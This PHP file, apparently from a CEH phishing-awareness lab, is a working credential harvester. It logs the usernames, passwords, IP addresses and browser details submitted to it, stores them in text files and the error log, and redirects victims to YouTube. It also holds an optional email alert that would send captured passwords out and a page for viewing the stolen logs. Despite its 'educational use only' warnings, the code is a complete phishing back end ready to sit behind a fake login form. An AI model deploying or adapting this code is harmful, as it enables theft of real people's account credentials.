<?php
// ============================================================
//  capture.php — Credential Logger (EDUCATIONAL USE ONLY)
//  CEH Trainer Demo | Phishing Awareness Lab
//  ⚠️ NEVER use on real users — IT Act 2000 violation
// ============================================================

// ── CONFIG ──────────────────────────────────────────────────
$LOG_FILE   = "captured_creds.txt";   // Log file path
$REDIRECT   = "https://www.youtube.com"; // DIRECT YOUTUBE REDIRECT
$TIMESTAMP  = date("Y-m-d H:i:s");
// ────────────────────────────────────────────────────────────

// Create logs directory if it doesn't exist
$log_dir = dirname($LOG_FILE);
if (!file_exists($log_dir) && $log_dir != '.') {
    mkdir($log_dir, 0755, true);
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Sanitize input (basic)
    $username  = htmlspecialchars($_POST["username"]  ?? "N/A", ENT_QUOTES, 'UTF-8');
    $password  = htmlspecialchars($_POST["password"]  ?? "N/A", ENT_QUOTES, 'UTF-8');
    $ip        = $_SERVER["REMOTE_ADDR"]              ?? "Unknown";
    $useragent = $_SERVER["HTTP_USER_AGENT"]          ?? "Unknown";
    
    // Get additional info if available
    $referer   = $_SERVER["HTTP_REFERER"]             ?? "Direct";
    $method    = $_SERVER["REQUEST_METHOD"]           ?? "Unknown";

    // ── Log to file with timestamp ───────────────────────────
    $log_entry = "=============================================\n";
    $log_entry .= "[CAPTURED] $TIMESTAMP\n";
    $log_entry .= "---------------------------------------------\n";
    $log_entry .= "  Username  : $username\n";
    $log_entry .= "  Password  : $password\n";
    $log_entry .= "  IP Address: $ip\n";
    $log_entry .= "  Browser   : $useragent\n";
    $log_entry .= "  Referer   : $referer\n";
    $log_entry .= "  Method    : $method\n";
    $log_entry .= "=============================================\n\n";

    // Write to log file
    file_put_contents($LOG_FILE, $log_entry, FILE_APPEND | LOCK_EX);

    // ── Also save to individual files for easy viewing (optional) ─
    $individual_file = "logs/credential_" . date("Y-m-d_H-i-s") . ".txt";
    if (!file_exists("logs")) {
        mkdir("logs", 0755, true);
    }
    file_put_contents($individual_file, $log_entry, LOCK_EX);

    // ── Log to PHP error log ─────────────────────────────────
    error_log("[PHISHING-DEMO] Credentials captured from $ip — User: $username");

    // ── Send email alert (optional - uncomment to enable) ────
    /*
    $to = "trainer@example.com";
    $subject = "PHISHING DEMO - Credentials Captured";
    $message = "Username: $username\nPassword: $password\nIP: $ip\nTime: $TIMESTAMP";
    $headers = "From: phishing-demo@localhost";
    mail($to, $subject, $message, $headers);
    */

    // ── Display captured credentials in browser (for demo) ───
    // Only show if coming from localhost or demo mode
    $show_demo_page = false; // Set to true to show credentials page before redirect
    
    if ($show_demo_page && ($ip == "127.0.0.1" || $ip == "::1")) {
        // Show demo page with captured credentials
        echo "<!DOCTYPE html>";
        echo "<html><head><title>Demo - Credentials Captured</title>";
        echo "<style>
                body { font-family: Arial; background: #f0f4f8; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 500px; }
                h2 { color: #d32f2f; }
                .cred { background: #fff3f3; padding: 15px; border-radius: 5px; margin: 15px 0; }
                .label { color: #666; font-size: 12px; }
                .value { color: #d32f2f; font-weight: bold; font-size: 18px; margin-bottom: 10px; }
                .redirect { color: #22409a; margin-top: 20px; }
            </style>";
        echo "</head><body>";
        echo "<div class='box'>";
        echo "<h2>⚠️ CREDENTIALS CAPTURED (DEMO)</h2>";
        echo "<div class='cred'>";
        echo "<div class='label'>Username:</div>";
        echo "<div class='value'>$username</div>";
        echo "<div class='label'>Password:</div>";
        echo "<div class='value'>$password</div>";
        echo "<div class='label'>IP Address:</div>";
        echo "<div class='value'>$ip</div>";
        echo "</div>";
        echo "<p>In real phishing attack, this data goes to hacker's server.</p>";
        echo "<p class='redirect'>🔜 Redirecting to YouTube in 3 seconds...</p>";
        echo "</div>";
        echo "<meta http-equiv='refresh' content='3;url=https://www.youtube.com'>";
        echo "</body></html>";
        exit();
    } else {
        // ── Redirect directly to YouTube ─────────────────────
        header("Location: https://www.youtube.com");
        exit();
    }

} elseif ($_SERVER["REQUEST_METHOD"] === "GET" && isset($_GET['view'])) {
    // ── Secret way to view logs (only from localhost) ────────
    $ip = $_SERVER["REMOTE_ADDR"] ?? "Unknown";
    if ($ip == "127.0.0.1" || $ip == "::1") {
        if ($_GET['view'] == 'logs' && file_exists($LOG_FILE)) {
            header("Content-Type: text/plain");
            echo "=== CAPTURED CREDENTIALS LOG ===\n\n";
            echo file_get_contents($LOG_FILE);
            exit();
        } elseif ($_GET['view'] == 'clear' && isset($_GET['confirm']) && $_GET['confirm'] == 'yes') {
            file_put_contents($LOG_FILE, "");
            echo "Log cleared successfully!";
            exit();
        }
    } else {
        http_response_code(403);
        echo "<h3>403 Forbidden - Localhost Only</h3>";
        exit();
    }
    
} else {
    // ── Direct access to this file without POST ──────────────
    // Show a simple form for testing (only from localhost)
    $ip = $_SERVER["REMOTE_ADDR"] ?? "Unknown";
    if ($ip == "127.0.0.1" || $ip == "::1") {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>PHP Capture Test</title>
            <style>
                body { font-family: Arial; background: #f0f4f8; padding: 20px; }
                .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
                h2 { color: #22409a; }
                input[type=text], input[type=password] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
                button { background: #22409a; color: white; padding: 12px; border: none; border-radius: 4px; width: 100%; cursor: pointer; }
                .links { margin-top: 20px; text-align: center; }
                .links a { color: #22409a; text-decoration: none; margin: 0 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>🔐 PHP Capture Test Page</h2>
                <p>This is a test form for capture.php</p>
                <form method="POST">
                    <input type="text" name="username" placeholder="Username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Test Capture</button>
                </form>
                <div class="links">
                    <a href="?view=logs">📋 View Logs</a>
                    <a href="?view=clear&confirm=yes" onclick="return confirm('Clear all logs?')">🗑️ Clear Logs</a>
                </div>
                <p style="margin-top:20px; font-size:12px; color:#666;">Log file: <?php echo $LOG_FILE; ?></p>
            </div>
        </body>
        </html>
        <?php
        exit();
    } else {
        http_response_code(403);
        echo "<h3>403 Forbidden - Direct access not allowed</h3>";
        exit();
    }
}
?>
